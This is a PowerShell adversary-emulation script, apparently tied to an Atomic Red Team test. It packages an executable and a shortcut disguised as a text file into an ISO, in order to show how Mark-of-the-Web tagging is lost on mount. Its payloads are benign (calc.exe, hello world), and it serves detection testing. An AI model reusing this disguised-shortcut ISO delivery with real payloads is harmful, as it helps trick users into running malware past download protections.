function Invoke-ISOBuilder {
    <#
  
    .NOTES
  
    Author  : @m_haggis
    Version : 1.0
    Purpose : PowerShell harness for building a ISO with an embedded exe and lnk.
  
   .DESCRIPTION
  
      The following harness outputs an LNK and exe, copies to a directory and converts it to an ISO file for delivery. 
   
   .EXAMPLE
  
      Invoke-ISOBuilder -method all
     
   .LINK
  
       https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-2---mount-an-iso-image-and-run-executable-from-the-iso
       https://gist.github.com/mgraeber-rc/a780834c983bc0d53121c39c276bd9f3
    #>
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateSet('All')]
        $method
    )


function Out-HelloWorld {
Add-Type -OutputAssembly hello.exe -TypeDefinition @'
using System;

public class Hello {
    public static void Main(string[] Args) {
        System.Console.WriteLine("Hello, world!");
        System.Console.Read();
    }
}
'@


# Simulate hello.exe having originated from the Internet Zone.

$FromTheInternet = @'
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://www.probablyevil.com/
HostUrl=https://www.probablyevil.com/hello.exe
'@

Set-Content -Path hello.exe -Stream Zone.Identifier -Value $FromTheInternet
}


function Out-ISO {


# Copy hello.exe into the FeelTheBurn directory. An ISO will be created from this directory.
mkdir FeelTheBurn
cp .\hello.exe .\FeelTheBurn\
cp "$([Environment]::GetFolderPath('Desktop'))\FakeText.lnk" c:\users\administrator\desktop\iso\FeelTheBurn\

# Simulate FeelTheBurn.iso having originated from the Internet Zone.
Set-Content -Path FeelTheBurn.iso -Stream Zone.Identifier -Value $FromTheInternet

# Validate that both files originated from the Internet Zone
Get-Content -Path .\hello.exe -Stream Zone.Identifier
Get-Content -Path .\FeelTheBurn\hello.exe -Stream Zone.Identifier

# Create an ISO file from the FeelTheBurn directory.
# New-IsoFile from: https://github.com/wikijm/PowerShell-AdminScripts/blob/master/Miscellaneous/New-IsoFile.ps1
ls .\FeelTheBurn\ | New-IsoFile -Path FeelTheBurn.iso -Media CDR -Title TestIso -force

# Simulate double-clicking the ISO and mount it.
$null = Mount-DiskImage -ImagePath "$PWD\FeelTheBurn.iso" -StorageType ISO -Access ReadOnly

# Observe that hello.exe, once mounted, no longer originates from the Internet Zone.
#Get-Content -Path D:\hello.exe -Stream Zone.Identifier

}

function Out-LnkFile {

    $path                      = "c:\users\administrator\desktop\iso\FakeText.lnk"
    $wshell                    = New-Object -ComObject Wscript.Shell
    $shortcut                  = $wshell.CreateShortcut($path)
    
    $shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
    
    $shortcut.TargetPath       = "cmd.exe"
    $shortcut.Arguments        = "/c calc.exe"
    $shortcut.WorkingDirectory = "C:"
    #$shortcut.HotKey           = "CTRL+C"
    $shortcut.Description      = "Nope, not malicious"
    
    $shortcut.WindowStyle      = 7
                               # 7 = Minimized window
                               # 3 = Maximized window
                               # 1 = Normal    window
    $shortcut.Save()
    
    (Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)

}

function Invoke-All {
    
    Out-LnkFile
    Out-HelloWorld
    Out-ISO
  }


switch ($method) {
    'All' { Invoke-All }
    }

} 
